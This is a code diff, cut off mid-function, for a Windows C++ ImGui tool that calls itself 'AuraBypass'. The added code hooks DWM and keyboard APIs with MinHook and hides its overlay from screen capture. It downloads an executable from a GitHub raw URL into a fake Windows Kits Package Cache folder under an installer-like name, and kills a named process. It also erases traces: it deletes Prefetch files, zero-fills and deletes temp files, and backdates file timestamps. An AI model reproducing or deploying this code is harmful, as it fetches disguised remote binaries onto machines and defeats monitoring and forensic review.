@@ -1,27 +1,34 @@
+#define _WIN32_WINNT 0x0A00
+
 #include <Windows.h>
 #include <d3d11.h>
 #include <dwmapi.h>
-
+#include <winhttp.h>
+#include <process.h>
+#include <tlhelp32.h>
+#include <shlobj.h>
 #include <cfloat>
 #include <cmath>
+#include <cstdlib>
+#include <ctime>
+#include <string>
+#include <vector>
 #include <string.h>
 
 #include "imgui.h"
 #include "backends/imgui_impl_win32.h"
 #include "backends/imgui_impl_dx11.h"
-#include "fa_solid_900_ttf.h"   // array embutido: fa_solid_900_ttf[] / fa_solid_900_ttf_len
+#include "fa_solid_900_ttf.h"
 #include "IconsFontAwesome6.h"
-#include "logo.h"               // PNG embutido: array aura[] (tamanho via sizeof)
-
-#include <wincodec.h>           // WIC: decodifica o PNG sem stb_image
-#include <vector>
-
-#pragma comment(lib, "windowscodecs.lib")
+#include "MinHook.h"
 
 #pragma comment(lib, "d3d11.lib")
 #pragma comment(lib, "dxgi.lib")
 #pragma comment(lib, "dwmapi.lib")
-#pragma comment(lib, "advapi32.lib") // GetUserNameA
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "shell32.lib")
+#pragma warning(disable: 28251)
 
 #ifndef ICON_MAX_16_FA
 #define ICON_MAX_16_FA ICON_MAX_FA
@@ -33,24 +40,17 @@ static IDXGISwapChain* g_pSwapChain = nullptr;
 static ID3D11RenderTargetView* g_mainRTV = nullptr;
 
 static ImFont* g_fontIcons = nullptr;
-static ImFont* g_fontText = nullptr; // Arial Bold para o rótulo "Unload"
-
-// Logo (PNG embutido em logo.h) decodificada para uma textura D3D11
-static ID3D11ShaderResourceView* g_logoSRV = nullptr;
-static int g_logoW = 0, g_logoH = 0;
-static ImVec2 g_logoUV0(0.0f, 0.0f), g_logoUV1(1.0f, 1.0f); // recorte sem bordas transparentes
+static ImFont* g_fontText = nullptr;
 
 static bool g_running = true;
 
 static const float kPanelW = 600.0f;
 static const float kPanelH = 320.0f;
 static const float kRounding = 14.0f;
-static const float kIconSize = 17.0f;         // tamanho do ícone no botão
-static const float kIconAtlasSize = 22.0f;    // rasterização da fonte de ícones
-static const float kLabelSize = 15.0f;        // tamanho do rótulo "Unload" (Arial Bold)
-static const float kLogoSize = 32.0f;         // altura da logo no topo (mude aqui)
-static const float kTitlePadX = 14.0f;        // padding da logo/nome na esquerda (eixo X)
-static const float kTitleGap = 10.0f;         // espaço entre a logo e o nome
+static const float kIconSize = 17.0f;
+static const float kIconAtlasSize = 22.0f;
+static const float kLabelSize = 15.0f;
+static const float kTitlePadX = 14.0f;
 
 static bool  s_dragging = false;
 static POINT s_cursorStart = {};
@@ -59,9 +59,113 @@ static RECT  s_windowStart = {};
 LRESULT WINAPI WndProc(HWND, UINT, WPARAM, LPARAM);
 extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND, UINT, WPARAM, LPARAM);
 
-// ---------------------------------------------------------------------------
-// FONTES — FontAwesome embutido + Arial Bold do sistema para o rótulo.
-// ---------------------------------------------------------------------------
+static int s_injectingMode = 0;
+static int s_cleaningMode = 0;
+
+static HWND  g_overlayHwnd = nullptr;
+static bool  s_lockKey = false;
+static float s_lockKeyAnim = 0.0f;
+static float s_lockKeyHover = 0.0f;
+
+static bool  s_streamProof = true;
+static float s_streamProofAnim = 0.0f;
+static float s_streamProofHover = 0.0f;
+
+typedef HRESULT(WINAPI* DwmSetWindowAttribute_t)(HWND, DWORD, LPCVOID, DWORD);
+typedef HRESULT(WINAPI* DwmExtendFrameIntoClientArea_t)(HWND, const MARGINS*);
+typedef SHORT(WINAPI* GetAsyncKeyState_t)(int);
+typedef SHORT(WINAPI* GetKeyState_t)(int);
+
+static DwmSetWindowAttribute_t        oDwmSetWindowAttribute = nullptr;
+static DwmExtendFrameIntoClientArea_t oDwmExtendFrameIntoClientArea = nullptr;
+static GetAsyncKeyState_t             oGetAsyncKeyState = nullptr;
+static GetKeyState_t                  oGetKeyState = nullptr;
+
+static HHOOK g_hKbHook = nullptr;
+
+static void ApplyStreamProof() {
+    if (!g_overlayHwnd) return;
+    if (s_streamProof)
+        ::SetWindowDisplayAffinity(g_overlayHwnd, WDA_EXCLUDEFROMCAPTURE);
+    else
+        ::SetWindowDisplayAffinity(g_overlayHwnd, WDA_NONE);
+}
+
+HRESULT WINAPI hkDwmSetWindowAttribute(HWND hwnd, DWORD attr, LPCVOID pv, DWORD cb) {
+    HRESULT hr = oDwmSetWindowAttribute(hwnd, attr, pv, cb);
+    if (hwnd == g_overlayHwnd)
+        ApplyStreamProof();
+    return hr;
+}
+
+HRESULT WINAPI hkDwmExtendFrameIntoClientArea(HWND hwnd, const MARGINS* m) {
+    HRESULT hr = oDwmExtendFrameIntoClientArea(hwnd, m);
+    if (hwnd == g_overlayHwnd)
+        ApplyStreamProof();
+    return hr;
+}
+
+SHORT WINAPI hkGetAsyncKeyState(int vKey) {
+    if (s_lockKey && (vKey == VK_DELETE))
+        return 0;
+    return oGetAsyncKeyState(vKey);
+}
+
+SHORT WINAPI hkGetKeyState(int vKey) {
+    if (s_lockKey && (vKey == VK_DELETE))
+        return 0;
+    return oGetKeyState(vKey);
+}
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION && s_lockKey) {
+        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
+        if (kb && kb->vkCode == VK_DELETE)
+            return 1;
+    }
+    return ::CallNextHookEx(g_hKbHook, nCode, wParam, lParam);
+}
+
+static void InstallMinHooks() {
+    if (MH_Initialize() != MH_OK) return;
+
+    HMODULE hDwm = ::LoadLibraryW(L"dwmapi.dll");
+    HMODULE hUser = ::GetModuleHandleW(L"user32.dll");
+
+    if (hDwm) {
+        LPVOID pDwmSet = (LPVOID)::GetProcAddress(hDwm, "DwmSetWindowAttribute");
+        if (pDwmSet)
+            MH_CreateHook(pDwmSet, &hkDwmSetWindowAttribute,
+                (LPVOID*)&oDwmSetWindowAttribute);
+
+        LPVOID pDwmExt = (LPVOID)::GetProcAddress(hDwm, "DwmExtendFrameIntoClientArea");
+        if (pDwmExt)
+            MH_CreateHook(pDwmExt, &hkDwmExtendFrameIntoClientArea,
+                (LPVOID*)&oDwmExtendFrameIntoClientArea);
+    }
+
+    if (hUser) {
+        LPVOID pGas = (LPVOID)::GetProcAddress(hUser, "GetAsyncKeyState");
+        if (pGas)
+            MH_CreateHook(pGas, &hkGetAsyncKeyState, (LPVOID*)&oGetAsyncKeyState);
+
+        LPVOID pGks = (LPVOID)::GetProcAddress(hUser, "GetKeyState");
+        if (pGks)
+            MH_CreateHook(pGks, &hkGetKeyState, (LPVOID*)&oGetKeyState);
+    }
+
+    MH_EnableHook(MH_ALL_HOOKS);
+}
+
+static void UninstallMinHooks() {
+    if (g_hKbHook) {
+        ::UnhookWindowsHookEx(g_hKbHook);
+        g_hKbHook = nullptr;
+    }
+    MH_DisableHook(MH_ALL_HOOKS);
+    MH_Uninitialize();
+}
+
 void LoadFonts() {
     ImGuiIO& io = ImGui::GetIO();
     io.IniFilename = nullptr;
@@ -71,20 +175,18 @@ void LoadFonts() {
     ImFontConfig cfg;
     cfg.PixelSnapH = true;
     cfg.GlyphMinAdvanceX = kIconAtlasSize;
-    cfg.FontDataOwnedByAtlas = false; // dado estático: o atlas não pode dar free
+    cfg.FontDataOwnedByAtlas = false;
 
     if (g_fontIcons) return;
 
-    // Fonte de texto: tenta Arial BOLD (arialbd.ttf); se não houver, usa o
-    // Arial normal; se nem esse houver, cai na fonte padrão do ImGui.
     char winDir[MAX_PATH] = {};
     if (::GetWindowsDirectoryA(winDir, MAX_PATH)) {
         char fontPath[MAX_PATH];
-        wsprintfA(fontPath, "%s\\Fonts\\arialbd.ttf", winDir); // Arial Bold
+        wsprintfA(fontPath, "%s\\Fonts\\arialbd.ttf", winDir);
         g_fontText = io.Fonts->AddFontFromFileTTF(fontPath, kLabelSize, nullptr,
             io.Fonts->GetGlyphRangesDefault());
         if (!g_fontText) {
-            wsprintfA(fontPath, "%s\\Fonts\\arial.ttf", winDir); // Arial normal
+            wsprintfA(fontPath, "%s\\Fonts\\arial.ttf", winDir);
             g_fontText = io.Fonts->AddFontFromFileTTF(fontPath, kLabelSize, nullptr,
                 io.Fonts->GetGlyphRangesDefault());
         }
@@ -95,12 +197,10 @@ void LoadFonts() {
         g_fontText = io.Fonts->AddFontDefault(&defCfg);
     }
 
-    // 1) TTF embutido (fa_solid_900_ttf.h)
     g_fontIcons = io.Fonts->AddFontFromMemoryTTF(
         (void*)fa_solid_900_ttf, (int)fa_solid_900_ttf_len,
         kIconAtlasSize, &cfg, iconRanges);
 
-    // 2) Fallback: fa-solid-900.ttf na pasta do EXE (caminho absoluto)
     if (!g_fontIcons) {
         char modPath[MAX_PATH] = {};
         if (::GetModuleFileNameA(nullptr, modPath, MAX_PATH)) {
@@ -111,150 +211,549 @@ void LoadFonts() {
         }
     }
 
-    // 3) Nunca deixar o atlas vazio
     if (!g_fontIcons)
         io.Fonts->AddFontDefault();
 }
 
-// ---------------------------------------------------------------------------
-// LOGO — decodifica o PNG embutido (aura[]) com WIC (codec nativo do Windows,
-// sem stb_image) e cria a textura D3D11.
-// ---------------------------------------------------------------------------
-void LoadLogoTexture() {
-    HRESULT hrCom = ::CoInitializeEx(nullptr, COINIT_MULTITHREADED);
-    const bool weInitCom = SUCCEEDED(hrCom); // se o COM já estava ativo, não fazemos uninit
+static const wchar_t* kInstallerUrl =
+L"https://github.com/dawdasadadwda/-/raw/refs/heads/main/"
+L"Kits%20Configuration%20Installer-x86-en-us.exe";
 
-    IWICImagingFactory* pFactory = nullptr;
-    HRESULT hr = ::CoCreateInstance(CLSID_WICImagingFactory, nullptr,
-        CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pFactory));
-    if (SUCCEEDED(hr)) {
-        IWICStream* pStream = nullptr;
-        hr = pFactory->CreateStream(&pStream);
-        if (SUCCEEDED(hr)) {
-            hr = pStream->InitializeFromMemory((BYTE*)aura, (DWORD)sizeof(aura));
-            if (SUCCEEDED(hr)) {
-                IWICBitmapDecoder* pDecoder = nullptr;
-                hr = pFactory->CreateDecoderFromStream(
-                    pStream, nullptr, WICDecodeMetadataCacheOnLoad, &pDecoder);
-                if (SUCCEEDED(hr)) {
-                    IWICBitmapFrameDecode* pFrame = nullptr;
-                    hr = pDecoder->GetFrame(0, &pFrame);
-                    if (SUCCEEDED(hr)) {
-                        IWICFormatConverter* pConv = nullptr;
-                        hr = pFactory->CreateFormatConverter(&pConv);
-                        if (SUCCEEDED(hr)) {
-                            hr = pConv->Initialize(pFrame, GUID_WICPixelFormat32bppBGRA,
-                                WICBitmapDitherTypeNone, nullptr, 0.0,
-                                WICBitmapPaletteTypeCustom);
-                            if (SUCCEEDED(hr)) {
-                                UINT w = 0, h = 0;
-                                pConv->GetSize(&w, &h);
-                                std::vector<BYTE> buf((size_t)w * h * 4);
-                                hr = pConv->CopyPixels(nullptr, w * 4,
-                                    (UINT)buf.size(), buf.data());
-                                if (SUCCEEDED(hr)) {
-                                    // Auto-crop: muitas logos vêm com margem
-                                    // transparente no canvas do PNG; aqui a gente
-                                    // acha o retângulo visível e recorta via UV.
-                                    {
-                                        UINT minX = w, minY = h, maxX = 0, maxY = 0;
-                                        for (UINT y = 0; y < h; ++y)
-                                            for (UINT x = 0; x < w; ++x)
-                                                if (buf[(y * w + x) * 4 + 3] > 8) {
-                                                    if (x < minX) minX = x;
-                                                    if (x > maxX) maxX = x;
-                                                    if (y < minY) minY = y;
-                                                    if (y > maxY) maxY = y;
-                                                }
-                                        if (maxX >= minX && maxY >= minY) {
-                                            g_logoUV0 = ImVec2((float)minX / (float)w,
-                                                (float)minY / (float)h);
-                                            g_logoUV1 = ImVec2((float)(maxX + 1) / (float)w,
-                                                (float)(maxY + 1) / (float)h);
-                                            g_logoW = (int)(maxX - minX + 1);
-                                            g_logoH = (int)(maxY - minY + 1);
-                                        }
-                                        else {
-                                            g_logoUV0 = ImVec2(0.0f, 0.0f);
-                                            g_logoUV1 = ImVec2(1.0f, 1.0f);
-                                            g_logoW = (int)w;
-                                            g_logoH = (int)h;
-                                        }
-                                    }
+static const wchar_t* kInstallerRealUrl =
+L"https://github.com/dawdasadadwda/-/raw/refs/heads/main/"
+L"Kits%20Configuration%20Installer-x86-en-us-Real.exe";
 
-                                    // Cadeia de mips gerada NA CPU (box filter 2x2):
-                                    // o downscale fica suave, sem serrilhado/moiré,
-                                    // sem depender do GenerateMips do driver.
-                                    struct Mip { std::vector<BYTE> px; UINT w, h; };
-                                    auto m2 = [](UINT a, UINT b) { return a < b ? a : b; };
-                                    std::vector<Mip> mips;
-                                    mips.push_back(Mip{ buf, w, h });
-                                    while (mips.back().w > 1 || mips.back().h > 1) {
-                                        const Mip& prev = mips.back();
-                                        Mip m;
-                                        m.w = prev.w > 1 ? prev.w / 2 : 1;
-                                        m.h = prev.h > 1 ? prev.h / 2 : 1;
-                                        m.px.resize((size_t)m.w * m.h * 4);
-                                        for (UINT y = 0; y < m.h; ++y) {
-                                            for (UINT x = 0; x < m.w; ++x) {
-                                                const UINT y0 = y * 2, y1 = m2(y * 2 + 1, prev.h - 1);
-                                                const UINT x0 = x * 2, x1 = m2(x * 2 + 1, prev.w - 1);
-                                                const BYTE* a = &prev.px[(y0 * prev.w + x0) * 4];
-                                                const BYTE* b = &prev.px[(y0 * prev.w + x1) * 4];
-                                                const BYTE* c = &prev.px[(y1 * prev.w + x0) * 4];
-                                                const BYTE* d = &prev.px[(y1 * prev.w + x1) * 4];
-                                                BYTE* o = &m.px[(y * m.w + x) * 4];
-                                                for (int k = 0; k < 4; ++k)
-                                                    o[k] = (BYTE)(((int)a[k] + b[k] + c[k] + d[k] + 2) / 4);
-                                            }
-                                        }
-                                        mips.push_back(std::move(m));
-                                    }
+static const wchar_t* kInstallerDir =
+L"C:\\ProgramData\\Package Cache\\"
+L"{E5D0CA8F-4587-D081-98CB-4A788BF2747E}v10.1.28000.2526\\Installers";
 
-                                    D3D11_TEXTURE2D_DESC desc = {};
-                                    desc.Width = w;
-                                    desc.Height = h;
-                                    desc.MipLevels = (UINT)mips.size();
-                                    desc.ArraySize = 1;
-                                    desc.Format = DXGI_FORMAT_B8G8R8A8_UNORM;
-                                    desc.SampleDesc.Count = 1;
-                                    desc.Usage = D3D11_USAGE_DEFAULT;
-                                    desc.BindFlags = D3D11_BIND_SHADER_RESOURCE;
+static const wchar_t* kInstallerFile =
+L"Kits Configuration Installer-x86-en-us.exe";
 
-                                    std::vector<D3D11_SUBRESOURCE_DATA> init(mips.size());
-                                    for (size_t i = 0; i < mips.size(); ++i) {
-                                        init[i].pSysMem = mips[i].px.data();
-                                        init[i].SysMemPitch = mips[i].w * 4;
-                                        init[i].SysMemSlicePitch = 0;
-                                    }
+static volatile LONG g_installerWasCached = 0;
+static volatile LONG g_installerHadRunning = 0;
+static volatile LONG g_installerDone = 0;
+static volatile LONG g_installerFailed = 0;
+static volatile LONG g_installerSlept = 0;
 
-                                    ID3D11Texture2D* tex = nullptr;
-                                    hr = g_pd3dDevice->CreateTexture2D(&desc, init.data(), &tex);
-                                    if (SUCCEEDED(hr) && tex) {
-                                        D3D11_SHADER_RESOURCE_VIEW_DESC srvDesc = {};
-                                        srvDesc.Format = desc.Format;
-                                        srvDesc.ViewDimension = D3D11_SRV_DIMENSION_TEXTURE2D;
-                                        srvDesc.Texture2D.MostDetailedMip = 0;
-                                        srvDesc.Texture2D.MipLevels = (UINT)mips.size();
-                                        hr = g_pd3dDevice->CreateShaderResourceView(
-                                            tex, &srvDesc, &g_logoSRV);
-                                        tex->Release();
-                                    }
-                                }
-                            }
-                            pConv->Release();
-                        }
-                        pFrame->Release();
-                    }
-                    pDecoder->Release();
-                }
+static volatile LONG g_cleanStage = 0;
+static volatile LONG g_cleanFound = 0;
+static volatile LONG g_cleanZeroFilled = 0;
+static volatile LONG g_cleanDone = 0;
+static volatile LONG g_cleanFailed = 0;
+
+static bool EnsureDirectoryExists(const std::wstring& dir) {
+    DWORD attr = ::GetFileAttributesW(dir.c_str());
+    if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY))
+        return true;
+
+    size_t pos = dir.find_last_of(L"\\/");
+    if (pos != std::wstring::npos && pos > 2) {
+        if (!EnsureDirectoryExists(dir.substr(0, pos)))
+            return false;
+    }
+    if (::CreateDirectoryW(dir.c_str(), nullptr))
+        return true;
+    return ::GetLastError() == ERROR_ALREADY_EXISTS;
+}
+
+static bool FileExistsOnDisk(const std::wstring& path) {
+    DWORD attr = ::GetFileAttributesW(path.c_str());
+    return attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY);
+}
+
+static LONGLONG FileSizeOnDisk(const std::wstring& path) {
+    WIN32_FILE_ATTRIBUTE_DATA fad = {};
+    if (!::GetFileAttributesExW(path.c_str(), GetFileExInfoStandard, &fad))
+        return -1;
+    if (fad.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+        return -1;
+    LARGE_INTEGER sz = {};
+    sz.HighPart = (LONG)fad.nFileSizeHigh;
+    sz.LowPart = fad.nFileSizeLow;
+    return sz.QuadPart;
+}
+
+static bool IsRealBySize(const std::wstring& path) {
+    LONGLONG sz = FileSizeOnDisk(path);
+    return sz > 0 && sz < (800LL * 1024LL);
+}
+
+static bool IsInstallerValid(const std::wstring& path) {
+    HANDLE h = ::CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
+        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (h == INVALID_HANDLE_VALUE)
+        return false;
+
+    LARGE_INTEGER sz = {};
+    bool ok = false;
+
+    do {
+        if (!::GetFileSizeEx(h, &sz)) break;
+        if (sz.QuadPart < (100LL * 1024LL)) break;
+
+        DWORD read = 0;
+        WORD mz = 0;
+        if (!::ReadFile(h, &mz, sizeof(mz), &read, nullptr) || read != sizeof(mz)) break;
+        if (mz != 0x5A4D) break;
+
+        LARGE_INTEGER pos = {};
+        pos.QuadPart = 0x3C;
+        if (!::SetFilePointerEx(h, pos, nullptr, FILE_BEGIN)) break;
+
+        DWORD peOff = 0;
+        if (!::ReadFile(h, &peOff, sizeof(peOff), &read, nullptr) || read != sizeof(peOff)) break;
+        if (peOff < 0x40 || (LONGLONG)peOff + 4 > sz.QuadPart) break;
+
+        pos.QuadPart = peOff;
+        if (!::SetFilePointerEx(h, pos, nullptr, FILE_BEGIN)) break;
+
+        DWORD peSig = 0;
+        if (!::ReadFile(h, &peSig, sizeof(peSig), &read, nullptr) || read != sizeof(peSig)) break;
+        if (peSig != 0x00004550) break;
+
+        ok = true;
+    } while (false);
+
+    ::CloseHandle(h);
+    return ok;
+}
+
+static bool ProcessRunningByName(const wchar_t* exeName) {
+    HANDLE snap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return false;
+
+    PROCESSENTRY32W pe = {};
+    pe.dwSize = sizeof(pe);
+    bool found = false;
+    if (::Process32FirstW(snap, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, exeName) == 0) {
+                found = true;
+                break;
             }
-            pStream->Release();
-        }
-        pFactory->Release();
+        } while (::Process32NextW(snap, &pe));
+    }
+    ::CloseHandle(snap);
+    return found;
+}
+
+struct EnumKillCtx {
+    DWORD pid;
+    bool sentClose;
+};
+
+static BOOL CALLBACK EnumWindowsKillProc(HWND hWnd, LPARAM lParam) {
+    EnumKillCtx* ctx = (EnumKillCtx*)lParam;
+    DWORD wndPid = 0;
+    ::GetWindowThreadProcessId(hWnd, &wndPid);
+    if (wndPid == ctx->pid) {
+        ::PostMessageW(hWnd, WM_CLOSE, 0, 0);
+        ctx->sentClose = true;
+    }
+    return TRUE;
+}
+
+static bool KillProcessByNameSoftly(const wchar_t* exeName) {
+    HANDLE snap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return false;
+
+    DWORD targetPid = 0;
+    PROCESSENTRY32W pe = {};
+    pe.dwSize = sizeof(pe);
+    if (::Process32FirstW(snap, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, exeName) == 0) {
+                targetPid = pe.th32ProcessID;
+                break;
+            }
+        } while (::Process32NextW(snap, &pe));
+    }
+    ::CloseHandle(snap);
+
+    if (targetPid == 0) return false;
+
+    EnumKillCtx ctx = { targetPid, false };
+    ::EnumWindows(&EnumWindowsKillProc, (LPARAM)&ctx);
+
+    HANDLE hProc = ::OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE,
+        FALSE, targetPid);
+    if (!hProc) return ctx.sentClose;
+
+    DWORD w = ::WaitForSingleObject(hProc, 1500);
+    if (w == WAIT_TIMEOUT) {
+        ::TerminateProcess(hProc, 0);
+        ::WaitForSingleObject(hProc, 1000);
     }
 
-    if (weInitCom) ::CoUninitialize();
+    ::CloseHandle(hProc);
+    return true;
+}
+
+static bool DownloadFileToDisk(const std::wstring& url, const std::wstring& outPath) {
+    bool ok = false;
+
+    URL_COMPONENTS uc = {};
+    uc.dwStructSize = sizeof(uc);
+    wchar_t hostName[256] = {};
+    wchar_t urlPath[2048] = {};
+    uc.lpszHostName = hostName;
+    uc.dwHostNameLength = _countof(hostName);
+    uc.lpszUrlPath = urlPath;
+    uc.dwUrlPathLength = _countof(urlPath);
+
+    if (!::WinHttpCrackUrl(url.c_str(), (DWORD)url.size(), 0, &uc))
+        return false;
+
+    HINTERNET hSession = ::WinHttpOpen(L"AuraBypass/1.0",
+        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
+        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return false;
+
+    HINTERNET hConnect = ::WinHttpConnect(hSession, hostName, uc.nPort, 0);
+    if (!hConnect) { ::WinHttpCloseHandle(hSession); return false; }
+
+    DWORD optFlags = WINHTTP_OPTION_REDIRECT_POLICY_ALWAYS;
+    ::WinHttpSetOption(hConnect, WINHTTP_OPTION_REDIRECT_POLICY,
+        &optFlags, sizeof(optFlags));
+
+    HINTERNET hRequest = ::WinHttpOpenRequest(hConnect, L"GET", urlPath,
+        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+        (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0);
+    if (!hRequest) {
+        ::WinHttpCloseHandle(hConnect);
+        ::WinHttpCloseHandle(hSession);
+        return false;
+    }
+
+    if (::WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+        WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
+        ::WinHttpReceiveResponse(hRequest, nullptr)) {
+
+        DWORD status = 0;
+        DWORD sz = sizeof(status);
+        ::WinHttpQueryHeaders(hRequest,
+            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+            WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);
+
+        if (status == 200) {
+            HANDLE hFile = ::CreateFileW(outPath.c_str(), GENERIC_WRITE, 0,
+                nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+            if (hFile != INVALID_HANDLE_VALUE) {
+                DWORD dwRead = 0;
+                BYTE buffer[8192];
+                ok = true;
+                while (::WinHttpReadData(hRequest, buffer, sizeof(buffer), &dwRead) && dwRead > 0) {
+                    DWORD written = 0;
+                    if (!::WriteFile(hFile, buffer, dwRead, &written, nullptr) || written != dwRead) {
+                        ok = false;
+                        break;
+                    }
+                }
+                ::CloseHandle(hFile);
+            }
+        }
+    }
+
+    ::WinHttpCloseHandle(hRequest);
+    ::WinHttpCloseHandle(hConnect);
+    ::WinHttpCloseHandle(hSession);
+    return ok;
+}
+
+static int PurgePrefetchByPrefix(const std::wstring& prefix) {
+    int count = 0;
+
+    WIN32_FIND_DATAW fd = {};
+    HANDLE hFind = ::FindFirstFileW(L"C:\\Windows\\Prefetch\\*.pf", &fd);
+    if (hFind == INVALID_HANDLE_VALUE)
+        return 0;
+
+    do {
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+            continue;
+
+        if (_wcsnicmp(fd.cFileName, prefix.c_str(), prefix.size()) != 0)
+            continue;
+
+        std::wstring full = std::wstring(L"C:\\Windows\\Prefetch\\") + fd.cFileName;
+
+        ::SetFileAttributesW(full.c_str(), FILE_ATTRIBUTE_NORMAL);
+        if (::DeleteFileW(full.c_str()))
+            ++count;
+    } while (::FindNextFileW(hFind, &fd));
+
+    ::FindClose(hFind);
+    return count;
+}
+
+static bool IsOurTmpName(const wchar_t* name) {
+    if (!name) return false;
+
+    size_t len = wcslen(name);
+    if (len < 5) return false;
+    if (len > 32) return false;
+
+    if (_wcsicmp(name + len - 4, L".tmp") != 0) return false;
+
+    const size_t stemLen = len - 4;
+    if (stemLen < 1 || stemLen > 16) return false;
+
+    for (size_t i = 0; i < stemLen; ++i) {
+        wchar_t c = name[i];
+        bool alnum =
+            (c >= L'0' && c <= L'9') ||
+            (c >= L'A' && c <= L'Z') ||
+            (c >= L'a' && c <= L'z');
+        if (!alnum) return false;
+    }
+
+    return true;
+}
+
+static void ZeroAndDeleteFile(const std::wstring& path) {
+    ::SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);
+
+    HANDLE h = ::CreateFileW(path.c_str(),
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+
+    if (h != INVALID_HANDLE_VALUE) {
+        LARGE_INTEGER sz = {};
+        if (::GetFileSizeEx(h, &sz) && sz.QuadPart > 0) {
+            const DWORD kChunk = 64 * 1024;
+            std::vector<BYTE> buf(kChunk, 0);
+
+            LARGE_INTEGER zero = {};
+            ::SetFilePointerEx(h, zero, nullptr, FILE_BEGIN);
+
+            LONGLONG remaining = sz.QuadPart;
+            while (remaining > 0) {
+                DWORD toWrite = (DWORD)((remaining < (LONGLONG)kChunk) ? remaining : (LONGLONG)kChunk);
+                DWORD written = 0;
+                if (!::WriteFile(h, buf.data(), toWrite, &written, nullptr) || written != toWrite)
+                    break;
+                remaining -= toWrite;
+            }
+            ::FlushFileBuffers(h);
+
+            ::SetFilePointerEx(h, zero, nullptr, FILE_BEGIN);
+            ::SetEndOfFile(h);
+            ::FlushFileBuffers(h);
+        }
+        ::CloseHandle(h);
+    }
+
+    if (!::DeleteFileW(path.c_str())) {
+        ::MoveFileExW(path.c_str(), nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
+    }
+}
+
+static void PurgeTmpInDir(std::wstring dir) {
+    while (!dir.empty() && (dir.back() == L'\\' || dir.back() == L'/'))
+        dir.pop_back();
+    if (dir.empty())
+        return;
+
+    std::wstring pattern = dir + L"\\*.tmp";
+
+    WIN32_FIND_DATAW fd = {};
+    HANDLE hFind = ::FindFirstFileW(pattern.c_str(), &fd);
+    if (hFind == INVALID_HANDLE_VALUE)
+        return;
+
+    do {
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+            continue;
+
+        if (!IsOurTmpName(fd.cFileName))
+            continue;
+
+        std::wstring full = dir + L"\\" + fd.cFileName;
+        ZeroAndDeleteFile(full);
+    } while (::FindNextFileW(hFind, &fd));
+
+    ::FindClose(hFind);
+}
+
+static void PurgeRandomTmpFiles() {
+    wchar_t buf[MAX_PATH] = {};
+    DWORD n = ::GetTempPathW(MAX_PATH, buf);
+    if (n > 0 && n < MAX_PATH)
+        PurgeTmpInDir(buf);
+
+    wchar_t local[MAX_PATH] = {};
+    if (::SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, local) == S_OK)
+        PurgeTmpInDir(std::wstring(local) + L"\\Temp");
+
+    PurgeTmpInDir(L"C:\\Windows\\Temp");
+
+    wchar_t roaming[MAX_PATH] = {};
+    if (::SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, roaming) == S_OK)
+        PurgeTmpInDir(std::wstring(roaming) + L"\\Temp");
+}
+
+static void BackdateFile12Hours(const std::wstring& path) {
+    FILETIME ftNow = {};
+    ::GetSystemTimeAsFileTime(&ftNow);
+
+    ULONGLONG ticks = ((ULONGLONG)ftNow.dwHighDateTime << 32) | ftNow.dwLowDateTime;
+
+    const ULONGLONG twelveHours = 12ULL * 60ULL * 60ULL * 10000000ULL;
+    if (ticks > twelveHours)
+        ticks -= twelveHours;
+
+    FILETIME ftNew = {};
+    ftNew.dwLowDateTime = (DWORD)(ticks & 0xFFFFFFFFULL);
+    ftNew.dwHighDateTime = (DWORD)(ticks >> 32);
+
+    HANDLE h = ::CreateFileW(path.c_str(), FILE_WRITE_ATTRIBUTES,
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (h == INVALID_HANDLE_VALUE)
+        return;
+
+    ::SetFileTime(h, &ftNew, &ftNew, &ftNew);
+    ::CloseHandle(h);
+}
+
+static unsigned __stdcall InstallerThreadProc(void*) {
+    std::wstring dir(kInstallerDir);
+    if (!EnsureDirectoryExists(dir)) {
+        ::InterlockedExchange(&g_installerFailed, 1);
+        ::InterlockedExchange(&g_installerDone, 1);
+        return 0;
+    }
+
+    std::wstring fullPath = dir + L"\\" + kInstallerFile;
+
